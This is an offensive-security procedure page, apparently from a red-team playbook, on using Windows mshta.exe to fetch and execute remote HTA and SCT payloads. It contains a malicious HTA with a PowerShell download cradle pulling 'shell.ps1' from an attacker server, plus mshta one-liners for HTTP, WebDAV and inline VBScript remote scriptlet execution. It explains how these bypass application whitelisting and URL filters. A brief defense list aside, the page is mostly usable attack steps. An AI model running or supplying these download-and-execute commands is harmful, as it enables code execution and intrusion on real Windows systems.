---
id: b1e40429-bff6-49af-953a-a734729c33bb
name: Mshta-Remote-HTA-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.864343+00:00'
updated_at: '2023-04-10T20:37:11.415493+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote File Copy|T1105 - Remote File Copy]]'
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
sub_techniques: []
tags:
  - '[[tags/Mshta]]'
  - '[[tags/Windows - Download and execute methods]]'
commands:
  - '[[commands/Execute-HTA-Payload-via-HTTP]]'
  - '[[commands/Execute-HTA-Payload-via-WebDAV]]'
platforms:
  - Windows
tools: []
validated: true
---

# Mshta-Remote-HTA-Execution

## Summary

This procedure outlines how to use the Windows mshta.exe utility to remotely download and execute HTML Application (HTA) files or scripts from HTTP or WebDAV servers. It leverages mshta's ability to interpret remote content, allowing attackers to bypass application whitelisting restrictions and execute arbitrary code on a target Windows machine, often for initial payload delivery, lateral movement, or command execution.

## Description

Mshta.exe, the Microsoft HTML Application Host, is a signed Windows binary designed to run HTA files, which are HTML files with embedded scripts (VBScript, JScript). In offensive security scenarios, attackers host malicious HTA files or script objects (like SCT files) on controlled servers and invoke mshta from the target to fetch and execute them. This technique evades defenses by using a trusted binary and can be invoked via command line, scripts, or even living-off-the-land binaries. It is particularly effective in environments with restricted PowerShell or direct executable downloads, as it requires only outbound HTTP/WebDAV access. Success results in arbitrary code execution, potentially leading to persistence, data exfiltration, or further compromise. This maps to MITRE ATT&CK techniques for signed binary proxy execution and remote file copy, commonly used in command and control or lateral movement phases.

## Requirements

1. Network connectivity from the target Windows machine to the attacker's HTTP or WebDAV server (outbound ports 80/443 for HTTP, or WebDAV shares).
2. A hosted HTA file or SCT script on the remote server containing the desired payload (e.g., PowerShell download cradle or reverse shell).
3. User-level access on the target to execute mshta.exe (no admin privileges required unless the payload escalates).
4. WebDAV server setup if using UNC paths (e.g., via IIS or Apache with WebDAV module).

## Defense

- Disable or restrict mshta.exe execution via Group Policy (e.g., Software Restriction Policies or AppLocker) to prevent command-line invocations with remote URLs.
- Implement application whitelisting to block unsigned or remote HTA executions, and monitor for mshta spawning child processes like cmd.exe or powershell.exe.
- Use network segmentation and proxy filtering to block or inspect outbound connections to suspicious WebDAV/HTTP endpoints, logging anomalous file downloads.
- Enable Windows Defender Application Control (WDAC) or Endpoint Detection and Response (EDR) tools to detect proxy executions and unusual network fetches by signed binaries.

## Objectives

1. Remotely download and execute an HTA payload from an HTTP or WebDAV server using mshta.
2. Bypass application whitelisting by leveraging a signed Windows binary for code execution.
3. Establish command and control or deliver secondary payloads (e.g., scripts, binaries) on the target machine.
4. Achieve persistence or lateral movement by executing arbitrary commands without direct file writes.

## Instructions

### Step 1: Prepare the Remote Payload

**Context**: Before execution, ensure the HTA or SCT file is hosted on your controlled server. An HTA file can embed VBScript to download and run additional payloads, while an SCT file allows scriptlet execution. This step sets up the infrastructure but is performed on the attacker's side.

Create a simple HTA example (save as payload.hta on server):

```html
<SCRIPT>
CreateObject("WScript.Shell").Run "powershell -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://yourserver/shell.ps1')"
</SCRIPT>
```

For SCT (payload.sct), use a similar scriptlet. Verify accessibility via browser or curl from another machine.

**Expected Output**: Server responds with the file content when accessed via HTTP or WebDAV path.

### Step 2: Execute HTA Payload via HTTP Server

**Context**: This step uses mshta to fetch and run an HTA file directly from an HTTP endpoint. It is straightforward for scenarios with web server access and is useful for initial access or payload delivery where WebDAV is unavailable.

**Command** ([[commands/Execute-HTA-Payload-via-HTTP]]):

```cmd
mshta http://$_WEBSERVER/payload.hta
```

> This command launches mshta, which downloads the HTA from the specified HTTP URL, parses it, and executes any embedded scripts. The mshta window may briefly appear before closing if the payload includes a Close() call. Monitor for child processes (e.g., powershell.exe) spawned by the HTA. If blocked, check proxy logs for the download attempt.

**Expected Output**: No console output from mshta itself, but successful execution triggers the payload (e.g., network callback to attacker listener or file creation). Error if URL is unreachable: "The system cannot find the file specified."

### Step 3: Execute HTA Payload via WebDAV Server

**Context**: For environments allowing SMB/WebDAV access, use a UNC path to fetch the HTA. This mimics legitimate file shares and can blend with normal traffic, ideal for lateral movement within a network.

**Command** ([[commands/Execute-HTA-Payload-via-WebDAV]]):

```cmd
mshta \\$_WEBSERVER\$_SHARE\payload.hta
```

> Mshta resolves the UNC path, authenticates if needed (anonymous or provided creds), downloads the HTA, and executes it. This requires WebDAV enabled on the server. Use tools like cadaver or Explorer to test share access beforehand. Success is indicated by payload execution without authentication prompts if anonymous access is allowed.

**Expected Output**: Similar to HTTP: silent execution with payload effects. Errors include "Access denied" for auth failures or "Network path not found" for unreachable shares.

### Step 4: Execute Remote Script via Embedded VBScript

**Context**: For more obfuscated execution, use mshta with an inline VBScript to load a remote SCT (script component) file. This avoids direct HTA hosting and can execute JScript/VBScript payloads, useful for evading simple URL filters.

**Code** ([[codes/Mshta-VBScript-Remote-SCT-Execution]]):

```cmd
mshta vbscript:Close(Execute("GetObject(\"script:http://$_WEBSERVER/payload.sct\")"))
```

> The VBScript wrapper uses GetObject to fetch and instantiate the remote SCT, which runs its script body. The Close(Execute()) ensures the mshta window closes immediately. SCT files are XML-based and can contain download cradles or direct commands. Test the SCT endpoint first to confirm it loads without errors.

**Expected Output**: No visible output; the SCT script runs in memory. Look for indicators like network connections or process spawns from the script content.
